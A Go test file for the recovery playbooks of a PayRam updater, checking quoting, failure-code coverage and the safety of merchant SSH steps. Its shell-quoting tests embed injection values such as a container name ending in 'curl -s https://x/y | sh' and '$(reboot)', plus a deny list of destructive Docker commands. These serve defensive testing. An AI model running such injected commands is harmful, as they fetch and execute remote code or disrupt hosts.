package recovery

import (
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/payram/payram-updater/internal/jobs"
)

// allPlaybooks returns every registered playbook plus the unknown fallback.
func allPlaybooks() map[string]Playbook {
	out := make(map[string]Playbook, len(playbooks)+1)
	for code, pb := range playbooks {
		out[code] = pb
	}
	out["(unknown)"] = unknownPlaybook
	return out
}

// emittedFailureCodes scans the updater's non-test Go sources for every
// failure code it can put in a job, a plan or a backup result.
func emittedFailureCodes(t *testing.T) []string {
	t.Helper()
	root := filepath.Join("..", "..")
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`\b(?:FailureCode|CauseCode)\s*(?::|=)\s*"([A-Z][A-Z0-9_]+)"`),
		regexp.MustCompile(`\bFailure[A-Z][A-Za-z]*\s*=\s*"([A-Z][A-Z0-9_]+)"`),
		// switchover.StepError{Code: "..."}: the step's code becomes the
		// job's FailureCode or CauseCode.
		regexp.MustCompile(`StepError\{Code:\s*"([A-Z][A-Z0-9_]+)"`),
		// The engine's helpers that end a job: failBeforeChange(job, "X", ...),
		// finishFailed(job, "X", ...), putPayramBack(ctx, sw, job, "X", ...).
		regexp.MustCompile(`\b(?:failBeforeChange|finishFailed)\(\s*job,\s*"([A-Z][A-Z0-9_]+)"`),
		regexp.MustCompile(`\bputPayramBack\([^,]+,[^,]+,[^,]+,\s*"([A-Z][A-Z0-9_]+)"`),
	}
	seen := map[string]bool{}
	for _, dir := range []string{"internal", "cmd"} {
		err := filepath.WalkDir(filepath.Join(root, dir), func(path string, d os.DirEntry, err error) error {
			if err != nil {
				return err
			}
			if d.IsDir() {
				if filepath.Base(path) == "recovery" {
					return filepath.SkipDir // the registry itself
				}
				return nil
			}
			if !strings.HasSuffix(path, ".go") || strings.HasSuffix(path, "_test.go") {
				return nil
			}
			src, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			for _, re := range patterns {
				for _, m := range re.FindAllStringSubmatch(string(src), -1) {
					seen[m[1]] = true
				}
			}
			return nil
		})
		if err != nil {
			t.Fatalf("scan %s: %v", dir, err)
		}
	}
	codes := make([]string, 0, len(seen))
	for code := range seen {
		codes = append(codes, code)
	}
	sort.Strings(codes)
	return codes
}

func TestEveryEmittedFailureCodeHasPlaybook(t *testing.T) {
	codes := emittedFailureCodes(t)
	if len(codes) < 20 {
		t.Fatalf("source scan found only %d codes (%v); the scan is broken", len(codes), codes)
	}
	for _, required := range []string{
		jobs.FailureUpgradeRolledBack, jobs.FailureRollbackFailed, jobs.FailureUpgradeInterrupted,
		jobs.FailureDockerCreateFailed, jobs.FailureTargetNotAllowed, "HEALTHCHECK_FAILED", "BACKUP_FAILED",
	} {
		found := false
		for _, code := range codes {
			found = found || code == required
		}
		if !found {
			t.Errorf("source scan did not find %s; the scan is broken", required)
		}
	}
	for _, code := range codes {
		if _, ok := playbooks[code]; !ok {
			t.Errorf("failure code %s is emitted by the updater but has no playbook", code)
		}
	}
}

func TestStalePlaybooksExist(t *testing.T) {
	for _, state := range []jobs.JobState{
		jobs.JobStatePolicyFetching, jobs.JobStateManifestFetching,
		jobs.JobStateBackingUp, jobs.JobStateExecuting, jobs.JobStateVerifying,
	} {
		code := StalePlaybookCode(state)
		if _, ok := playbooks[code]; !ok {
			t.Errorf("state %s maps to %s, which has no playbook", state, code)
		}
	}
}

// destructiveCommands must never be among the first two steps a merchant runs.
var destructiveCommands = []string{"restore", "docker rm", "rm -", "prune", "docker stop", "docker rename", "systemctl stop"}

func TestPlaybooks_FirstTwoStepsAreReadOnly(t *testing.T) {
	for code, pb := range allPlaybooks() {
		for i := 0; i < 2 && i < len(pb.SSHSteps); i++ {
			step := strings.ToLower(pb.SSHSteps[i])
			for _, bad := range destructiveCommands {
				if strings.Contains(step, bad) {
					t.Errorf("%s step %d contains %q: %s", code, i+1, bad, pb.SSHSteps[i])
				}
			}
		}
	}
}

func TestPlaybooks_RestoreOnlyAsLabelledLastResort(t *testing.T) {
	for code, pb := range allPlaybooks() {
		for _, step := range pb.SSHSteps {
			if !strings.Contains(step, "backup restore") {
				continue
			}
			if !strings.Contains(step, "LAST RESORT") || !strings.Contains(step, dataLossWarning) {
				t.Errorf("%s offers a restore without the LAST RESORT label and data-loss warning: %s", code, step)
			}
			if strings.Contains(step, "--yes") {
				t.Errorf("%s restore step skips the confirmation prompt: %s", code, step)
			}
		}
		if strings.Contains(strings.ToLower(pb.UserMessage), "restore from backup") {
			t.Errorf("%s user message tells the merchant to restore: %s", code, pb.UserMessage)
		}
	}
}

func TestPlaybooks_NeverRecommendRemovingContainersOrImages(t *testing.T) {
	for code, pb := range allPlaybooks() {
		for _, step := range pb.SSHSteps {
			lower := strings.ToLower(step)
			for _, bad := range []string{"prune -a", "system prune", "container prune", "docker rm", "rmi "} {
				if strings.Contains(lower, bad) && !strings.Contains(step, "Do not") {
					t.Errorf("%s recommends %q: %s", code, bad, step)
				}
			}
		}
	}
}

func TestPlaybooks_DatabaseCommandsRunInsideTheContainer(t *testing.T) {
	banned := []string{"psql -h", "pg_dump -h", "pg_isready -h", "localhost:5432", "127.0.0.1:5432", "<db_port>", "/tmp/"}
	for code, pb := range allPlaybooks() {
		for _, step := range pb.SSHSteps {
			for _, bad := range banned {
				if strings.Contains(step, bad) {
					t.Errorf("%s uses %q: %s", code, bad, step)
				}
			}
			for _, tool := range []string{"psql", "pg_dump", "pg_isready"} {
				if strings.Contains(step, tool+" ") && !strings.Contains(step, "docker exec <container_name> sh -c '"+tool) {
					t.Errorf("%s runs %s outside docker exec: %s", code, tool, step)
				}
			}
		}
	}
}

func TestPlaybooks_SayFirstWhetherPayRamRunsAndDataIsSafe(t *testing.T) {
	dataPhrases := []string{"data is safe", "Your data is safe", "have not been deleted", "nothing has been deleted", "never deletes payment data"}
	for code, pb := range allPlaybooks() {
		firstSentence := strings.SplitN(pb.UserMessage, ". ", 2)[0]
		if !strings.Contains(firstSentence, "PayRam") {
			t.Errorf("%s user message does not open with PayRam's state: %s", code, pb.UserMessage)
		}
		saysData := false
		for _, phrase := range dataPhrases {
			saysData = saysData || strings.Contains(pb.UserMessage, phrase)
		}
		if !saysData {
			t.Errorf("%s user message does not say whether data is at risk: %s", code, pb.UserMessage)
		}
	}
}

func TestPlaybooks_NameSupport(t *testing.T) {
	for code, pb := range allPlaybooks() {
		if !strings.Contains(strings.Join(pb.SSHSteps, "\n"), "support@payram.com") {
			t.Errorf("%s has no step that names PayRam support", code)
		}
	}
}

func TestPlaybooks_NoFeesOrPricing(t *testing.T) {
	for code, pb := range allPlaybooks() {
		text := strings.ToLower(pb.Title + " " + pb.UserMessage + " " + strings.Join(pb.SSHSteps, " "))
		for _, bad := range []string{" fee", "pricing", "price"} {
			if strings.Contains(text, bad) {
				t.Errorf("%s mentions %q", code, bad)
			}
		}
	}
}

func TestPlaybooks_UnchangedMeansNoDataRisk(t *testing.T) {
	for code, pb := range allPlaybooks() {
		if pb.PayRamState == "" {
			t.Errorf("%s has no PayRamState", code)
		}
		if pb.PayRamState == PayRamUnchanged && pb.DataRisk != DataRiskNone {
			t.Errorf("%s says PayRam was not changed but has data risk %s", code, pb.DataRisk)
		}
	}
}

func TestPlaybookCompleteness(t *testing.T) {
	for code, pb := range allPlaybooks() {
		if len(pb.Title) < 5 {
			t.Errorf("%s has too short Title: %q", code, pb.Title)
		}
		if len(pb.UserMessage) < 20 {
			t.Errorf("%s has too short UserMessage: %q", code, pb.UserMessage)
		}
		if len(pb.SSHSteps) < 3 {
			t.Errorf("%s has too few steps: %d", code, len(pb.SSHSteps))
		}
		if pb.Severity == "" || pb.DataRisk == "" {
			t.Errorf("%s misses Severity or DataRisk", code)
		}
		if pb.DocsURL != "" && !strings.HasPrefix(pb.DocsURL, "https://") {
			t.Errorf("%s has invalid DocsURL: %s", code, pb.DocsURL)
		}
		for i, step := range pb.SSHSteps {
			if !strings.HasPrefix(step, strconv.Itoa(i+1)+". ") {
				t.Errorf("%s step %d is not numbered: %s", code, i+1, step)
			}
		}
	}
}

func TestPlaybookRegistry_KeysMatchCodes(t *testing.T) {
	for key, pb := range playbooks {
		if pb.Code != key {
			t.Errorf("playbook key %s has Code %s", key, pb.Code)
		}
	}
}

func TestPlaybookClassification(t *testing.T) {
	cases := []struct {
		code     string
		state    PayRamState
		severity Severity
		risk     DataRisk
	}{
		{jobs.FailureUpgradeRolledBack, PayRamRestored, SeverityInfo, DataRiskNone},
		{jobs.FailureUpgradeRolledBackRestored, PayRamRestored, SeverityInfo, DataRiskPossible},
		{jobs.FailureUpgradeMoneyMoved, PayRamUncertain, SeverityManual, DataRiskPossible},
		{jobs.FailureUpgradeDatabaseUnchecked, PayRamUncertain, SeverityManual, DataRiskPossible},
		{jobs.FailureUpgradeRestoreFailed, PayRamUncertain, SeverityManual, DataRiskPossible},
		{jobs.FailureUpgradeRestoreDeclined, PayRamUncertain, SeverityManual, DataRiskPossible},
		{"DATABASE_READ_FAILED", PayRamUnchanged, SeverityRetryable, DataRiskNone},
		{jobs.FailureUpgradeInterrupted, PayRamRestored, SeverityInfo, DataRiskNone},
		{jobs.FailureRollbackFailed, PayRamUncertain, SeverityManual, DataRiskPossible},
		{jobs.FailureDockerCreateFailed, PayRamUnchanged, SeverityManual, DataRiskNone},
		{jobs.FailureTargetNotAllowed, PayRamUnchanged, SeverityManual, DataRiskNone},
		{"DOCKER_PULL_FAILED", PayRamUnchanged, SeverityRetryable, DataRiskNone},
		{"POLICY_FETCH_FAILED", PayRamUnchanged, SeverityRetryable, DataRiskNone},
		{"BACKUP_FAILED", PayRamUnchanged, SeverityRetryable, DataRiskNone},
		{"BACKUP_TIMEOUT", PayRamUnchanged, SeverityRetryable, DataRiskNone},
		{"DISK_SPACE_LOW", PayRamUnchanged, SeverityManual, DataRiskNone},
		{"HEALTHCHECK_FAILED", PayRamUncertain, SeverityManual, DataRiskPossible},
		{"VERSION_MISMATCH", PayRamUncertain, SeverityManual, DataRiskPossible},
		{"DOCKER_ERROR", PayRamUncertain, SeverityManual, DataRiskPossible},
		{"MIGRATION_FAILED", PayRamUncertain, SeverityManual, DataRiskLikely},
		{"STALE_EXECUTING", PayRamUncertain, SeverityManual, DataRiskPossible},
		{"STALE_PREPARING", PayRamUnchanged, SeverityRetryable, DataRiskNone},
	}
	for _, tc := range cases {
		pb := GetPlaybook(tc.code)
		if pb.Code != tc.code || pb.PayRamState != tc.state || pb.Severity != tc.severity || pb.DataRisk != tc.risk {
			t.Errorf("%s: got (%s, %s, %s, %s), want (%s, %s, %s)",
				tc.code, pb.Code, pb.PayRamState, pb.Severity, pb.DataRisk, tc.state, tc.severity, tc.risk)
		}
	}
}

// The released updater v0.2.3 reports HEALTHCHECK_FAILED on healthy installs.
// Its advice must start with the health check and never lead to a restore
// before the merchant has seen whether PayRam is fine.
func TestHealthcheckFailed_ChecksHealthBeforeAnythingElse(t *testing.T) {
	pb := RenderPlaybook("HEALTHCHECK_FAILED", PlaybookContext{})
	if !strings.Contains(pb.SSHSteps[0], "curl -sk https://127.0.0.1/api/v1/health") ||
		!strings.Contains(pb.SSHSteps[0], "curl -s http://127.0.0.1/api/v1/health") {
		t.Errorf("first step must check health on 443 and 80: %s", pb.SSHSteps[0])
	}
	if !strings.Contains(pb.UserMessage, "v0.2.3") || !strings.Contains(pb.UserMessage, "nothing must be restored") {
		t.Errorf("user message must explain the false alarm: %s", pb.UserMessage)
	}
	for i, step := range pb.SSHSteps[:len(pb.SSHSteps)-1] {
		if strings.Contains(step, "restore --file") {
			t.Errorf("restore offered at step %d, before the last step: %s", i+1, step)
		}
	}
}

func TestRollbackFailed_StartsThePreviousContainer(t *testing.T) {
	pb := RenderPlaybook(jobs.FailureRollbackFailed, PlaybookContext{ContainerName: "payram"})
	text := strings.Join(pb.SSHSteps, "\n")
	for _, want := range []string{
		"docker ps -a --filter name=payram",
		"docker rename payram-previous payram",
		"docker update --restart unless-stopped payram",
		"docker start payram",
		"support@payram.com",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("ROLLBACK_FAILED steps miss %q:\n%s", want, text)
		}
	}
}

func TestDiskSpaceLow_KeepsImagesTheSwitchBackNeeds(t *testing.T) {
	pb := RenderPlaybook("DISK_SPACE_LOW", PlaybookContext{})
	text := strings.Join(pb.SSHSteps, "\n")
	for _, want := range []string{"docker image prune && docker builder prune", "du -sh /var/lib/payram/backups /var/log/journal", "payramapp/payram"} {
		if !strings.Contains(text, want) {
			t.Errorf("DISK_SPACE_LOW steps miss %q:\n%s", want, text)
		}
	}
}

func TestHealthCheckCommand(t *testing.T) {
	cases := []struct {
		baseURL  string
		want     string
		fallback bool
	}{
		{"", standardHealthChecks, false},
		{"https://127.0.0.1", "curl -sk https://127.0.0.1/api/v1/health", false},
		{"https://127.0.0.1:443/", "curl -sk https://127.0.0.1:443/api/v1/health", false},
		{"http://127.0.0.1", "curl -s http://127.0.0.1/api/v1/health", false},
		{"http://127.0.0.1:8080", "curl -s http://127.0.0.1:8080/api/v1/health", true},
		{"https://pay.example.com", "curl -sk https://pay.example.com/api/v1/health", true},
		{"not a url", standardHealthChecks, false},
	}
	for _, tc := range cases {
		got := healthCheckCommand(tc.baseURL)
		if !strings.HasPrefix(got, tc.want) {
			t.Errorf("healthCheckCommand(%q) = %q, want prefix %q", tc.baseURL, got, tc.want)
		}
		if hasFallback := got != tc.want && strings.Contains(got, standardHealthChecks); hasFallback != tc.fallback {
			t.Errorf("healthCheckCommand(%q) fallback = %v, want %v: %q", tc.baseURL, hasFallback, tc.fallback, got)
		}
	}
}

// A placeholder left in a step would be pasted into a shell as a redirect.
func TestRenderPlaybook_FillsEveryPlaceholder(t *testing.T) {
	full := PlaybookContext{
		ContainerName: "payram-prod",
		BaseURL:       "https://127.0.0.1",
		BackupPath:    "/data/backups/test.dump",
		TargetVersion: "1.9.0",
	}
	placeholder := regexp.MustCompile(`<[a-z_]+>`)
	for _, ctx := range []PlaybookContext{full, {}} {
		for code := range allPlaybooks() {
			pb := RenderPlaybook(code, ctx)
			for _, text := range append([]string{pb.UserMessage}, pb.SSHSteps...) {
				if m := placeholder.FindString(text); m != "" {
					t.Errorf("%s leaves %s unrendered: %s", code, m, text)
				}
			}
		}
	}
}

func TestRenderPlaybook_Defaults(t *testing.T) {
	pb := RenderPlaybook(jobs.FailureRollbackFailed, PlaybookContext{})
	text := strings.Join(pb.SSHSteps, "\n")
	for _, want := range []string{"name=payram", "payram-previous", "payram-next", standardHealthChecks, "--file BACKUP_FILE"} {
		if !strings.Contains(text, want) {
			t.Errorf("default rendering misses %q:\n%s", want, text)
		}
	}
	if pb.BackupPath != "" {
		t.Errorf("BackupPath = %q, want empty", pb.BackupPath)
	}
}

func TestRenderPlaybook_DoesNotModifyRegistry(t *testing.T) {
	before := strings.Join(GetPlaybook("BACKUP_FAILED").SSHSteps, "\n")
	RenderPlaybook("BACKUP_FAILED", PlaybookContext{ContainerName: "other"})
	if after := strings.Join(GetPlaybook("BACKUP_FAILED").SSHSteps, "\n"); after != before {
		t.Error("rendering changed the registered playbook")
	}
}

func TestRenderPlaybook_AppendsCause(t *testing.T) {
	pb := RenderPlaybook(jobs.FailureUpgradeRolledBack, PlaybookContext{CauseCode: "HEALTHCHECK_FAILED"})
	if pb.CauseCode != "HEALTHCHECK_FAILED" {
		t.Errorf("CauseCode = %q", pb.CauseCode)
	}
	if !strings.HasSuffix(pb.UserMessage, "What failed: Health Check Failed (HEALTHCHECK_FAILED).") {
		t.Errorf("user message does not name the cause: %s", pb.UserMessage)
	}
	if plain := RenderPlaybook(jobs.FailureUpgradeRolledBack, PlaybookContext{}); strings.Contains(plain.UserMessage, "What failed") {
		t.Errorf("cause sentence added without a cause: %s", plain.UserMessage)
	}
}

func TestRenderJobPlaybook_UsesWhatTheJobRecorded(t *testing.T) {
	job := jobs.NewJob("job-1", jobs.JobModeDashboard, "1.9.0")
	job.State = jobs.JobStateFailed
	job.FailureCode = jobs.FailureRollbackFailed
	job.CauseCode = "VERSION_MISMATCH"
	job.ContainerName = "payram-shop"
	job.PreviousContainer = "payram-shop-previous"
	job.CoreBaseURL = "http://127.0.0.1"
	job.BackupPath = "/var/lib/payram/backups/b.dump"

	pb := RenderJobPlaybook(job, PlaybookContext{ContainerName: "discovered", BaseURL: "http://127.0.0.1:8080"})
	text := strings.Join(pb.SSHSteps, "\n")
	for _, want := range []string{
		"docker rename payram-shop-previous payram-shop",
		"curl -s http://127.0.0.1/api/v1/health",
		"--file /var/lib/payram/backups/b.dump",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("job playbook misses %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "discovered") || strings.Contains(text, ":8080") {
		t.Errorf("job values must win over the caller's guesses:\n%s", text)
	}
	if pb.CauseCode != "VERSION_MISMATCH" || pb.BackupPath != job.BackupPath {
		t.Errorf("cause/backup not carried: %q %q", pb.CauseCode, pb.BackupPath)
	}
}

func TestIsStale(t *testing.T) {
	now := time.Date(2026, 10, 23, 12, 0, 0, 0, time.UTC)
	job := jobs.NewJob("job-1", jobs.JobModeDashboard, "1.9.0")

	job.State = jobs.JobStateExecuting
	job.UpdatedAt = now.Add(-30 * time.Second)
	if IsStale(job, now) {
		t.Error("job with a fresh heartbeat reported stale")
	}
	job.UpdatedAt = now.Add(-6 * time.Minute)
	if !IsStale(job, now) {
		t.Error("active job silent for 6 minutes not reported stale")
	}
	job.State = jobs.JobStateFailed
	if IsStale(job, now) {
		t.Error("finished job reported stale")
	}
	if IsStale(nil, now) {
		t.Error("nil job reported stale")
	}
}

func TestGetPlaybook_UnknownCode(t *testing.T) {
	pb := GetPlaybook("TOTALLY_UNKNOWN_ERROR")
	if pb.Code != "TOTALLY_UNKNOWN_ERROR" || pb.Severity != SeverityManual || pb.DataRisk != DataRiskUnknown || pb.Title != "Unknown Failure" {
		t.Errorf("unexpected unknown playbook: %+v", pb)
	}
	if empty := GetPlaybook(""); empty.Code != "" || empty.Severity != SeverityManual {
		t.Errorf("unexpected playbook for empty code: %+v", empty)
	}
}

func TestRetryabilityHelpers(t *testing.T) {
	for _, code := range []string{"POLICY_FETCH_FAILED", "MANIFEST_FETCH_FAILED", "DOCKER_PULL_FAILED", "BACKUP_FAILED", "CONCURRENCY_BLOCKED"} {
		if !IsRetryable(code) || RequiresManualIntervention(code) || HasDataRisk(code) {
			t.Errorf("%s should be retryable without data risk", code)
		}
	}
	for _, code := range []string{"HEALTHCHECK_FAILED", "VERSION_MISMATCH", "DOCKER_ERROR", jobs.FailureRollbackFailed} {
		if IsRetryable(code) || !RequiresManualIntervention(code) || !HasDataRisk(code) {
			t.Errorf("%s should need a person and carry possible data risk", code)
		}
	}
}

// TestPlaybooks_LeftOnTheNewVersionNeverAdviseARestoreOrTheOldVersion: when
// the new version may have moved money, restoring the backup or starting the
// previous version could send a payout twice.
func TestPlaybooks_LeftOnTheNewVersionNeverAdviseARestoreOrTheOldVersion(t *testing.T) {
	for _, code := range []string{jobs.FailureUpgradeMoneyMoved, jobs.FailureUpgradeDatabaseUnchecked, jobs.FailureUpgradeRestoreFailed, jobs.FailureUpgradeRestoreDeclined} {
		pb := RenderPlaybook(code, PlaybookContext{ContainerName: "payram"})
		for _, step := range pb.SSHSteps {
			if strings.Contains(step, "backup restore") || strings.Contains(step, "docker rename payram-previous") || strings.Contains(step, "docker start payram-previous") {
				t.Errorf("%s step advises a restore or the previous version: %s", code, step)
			}
		}
		if !strings.Contains(pb.UserMessage, "support") {
			t.Errorf("%s does not send the merchant to support: %s", code, pb.UserMessage)
		}
	}
}

// TestRolledBack_NoLongerPromisesAnUncheckedDatabase: UPGRADE_ROLLED_BACK
// now means the updater checked that the new version left the database fit.
func TestRolledBack_NoLongerPromisesAnUncheckedDatabase(t *testing.T) {
	if msg := GetPlaybook(jobs.FailureUpgradeRolledBack).UserMessage; !strings.Contains(msg, "after checking that the new version had not changed the database's structure") {
		t.Errorf("UPGRADE_ROLLED_BACK message: %s", msg)
	}
	if msg := GetPlaybook(jobs.FailureUpgradeRolledBackRestored).UserMessage; !strings.Contains(msg, "restored the backup") || !strings.Contains(msg, "found again") {
		t.Errorf("UPGRADE_ROLLED_BACK_RESTORED message: %s", msg)
	}
}

func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		"payram":            "payram",
		"payram-e2e_1.prod": "payram-e2e_1.prod",
		"/var/lib/payram/backups/b-3.1.3-to-3.10.0.dump": "/var/lib/payram/backups/b-3.1.3-to-3.10.0.dump",
		"payram; curl -s https://x/y | sh #":             "'payram; curl -s https://x/y | sh #'",
		"it's":                                           `'it'"'"'s'`,
		"$(reboot)":                                      "'$(reboot)'",
		"":                                               "''",
	}
	for in, want := range cases {
		if got := ShellQuote(in); got != want {
			t.Errorf("ShellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

// TestRenderPlaybook_QuotesAContainerNameFromTheManifest (audit L6): a name
// a tampered manifest supplied must stay one argument in every command.
func TestRenderPlaybook_QuotesAContainerNameFromTheManifest(t *testing.T) {
	evil := "payram; curl -s https://x/y | sh #"
	for code := range allPlaybooks() {
		pb := RenderPlaybook(code, PlaybookContext{ContainerName: evil, BackupPath: "/backups/a b.dump"})
		for _, step := range pb.SSHSteps {
			// Every occurrence opens a single-quoted word ('<name>' or
			// '<name>-previous').
			if strings.Count(step, evil) != strings.Count(step, "'"+evil) {
				t.Errorf("%s renders the name unquoted: %s", code, step)
			}
			if strings.Contains(step, "/backups/a b.dump") && !strings.Contains(step, "'/backups/a b.dump'") {
				t.Errorf("%s renders the backup path unquoted: %s", code, step)
			}
		}
	}
}
